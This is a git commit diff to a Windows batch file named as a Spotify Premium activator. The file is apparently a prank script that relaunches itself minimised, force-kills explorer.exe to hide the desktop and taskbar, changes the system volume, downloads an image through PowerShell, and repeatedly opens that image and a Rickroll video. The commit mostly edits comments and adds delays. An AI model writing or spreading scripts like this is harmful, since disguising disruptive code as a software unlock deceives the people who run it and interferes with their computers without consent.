81932926f3bb02c6186bd81dcf02dd66152f320e
pabloc25 <pablocarfor@gmail.com>
2025-02-17 09:53:51 +0100

    refactor: simplify volume setting and enhance image download process in spotify activation script

--- bromita/spotifypremium.bat
+++ bromita/spotifypremium.bat
@@ -8,7 +8,7 @@ timeout /t 2 /nobreak >nul
 if "%1"=="hidden" goto hidden
 start /min cmd /c "%~f0 hidden"
 exit
-:: sube el volumen al 100%
+:: sube el volumen 
 nircmd.exe setsysvolume 50000
 
 :hidden
@@ -16,15 +16,19 @@ nircmd.exe setsysvolume 50000
 :: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
 taskkill /f /im explorer.exe
 
-rem Configurar la ruta de la imagen en la carpeta temporal
+:: Configurar la ruta de la imagen en la carpeta temporal
 set "imagen=%temp%\bormilla.jpg"
 
-rem Descargar la imagen desde internet usando PowerShell
+timeout /t 2 >nul 
+
+:: Descargar la imagen desde internet usando PowerShell
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8Uocf1ECXac_MHIdh8ySMDvz1fyemiTEGuw&s', '%imagen%')"
 
 set "repeticiones=3"
 
+:: Bucle de la broma
 for /L %%i in (1,1,%repeticiones%) do (
-    start "" "%imagen%"
-    start https://www.youtube.com/watch?v=dQw4w9WgXcQ  
+    start "" "%imagen%"  ;:: Abre la imagen
+    start https://www.youtube.com/watch?v=dQw4w9WgXcQ  ;:: Rickroll
+    timeout /t 2 /nobreak >nul
 )
